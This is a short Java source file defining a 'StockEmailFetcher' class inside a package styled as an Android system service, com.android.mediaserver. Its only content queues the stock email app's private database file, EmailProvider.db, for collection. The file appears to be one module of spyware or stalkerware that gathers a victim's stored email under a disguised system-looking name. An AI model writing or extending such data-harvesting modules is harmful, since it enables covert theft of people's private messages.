package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class StockEmailFetcher extends FileFetcher {
  public StockEmailFetcher() {
    mFetchedFiles = new ArrayList();
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.google.android.email/databases/EmailProvider.db"),
            "APP", "email"));
  }
}
